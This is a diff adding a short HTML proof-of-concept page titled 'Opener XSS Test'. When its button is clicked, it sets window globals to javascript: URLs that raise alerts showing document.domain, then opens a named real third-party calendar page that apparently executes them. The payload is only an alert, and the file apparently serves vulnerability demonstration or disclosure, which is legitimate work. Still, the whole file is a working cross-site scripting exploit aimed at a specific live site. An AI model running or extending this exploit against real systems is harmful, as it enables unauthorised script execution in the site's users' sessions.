@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Opener XSS Test</h2>
+    <button onclick="run()">Open Vulnerable Page</button>
+
+    <script>
+      function run() {
+        // Set global variables (this window = attacker)
+        window.calDocTop = "javascript:alert('TOP XSS: ' + document.domain)";
+        window.calDocBottom = "javascript:alert('BOTTOM XSS')";
+
+        // Open the vulnerable page
+        window.open("https://pecs.cat.com/pecs_tc/calendar.html");
+      }
+    </script>
+  </body>
+</html>
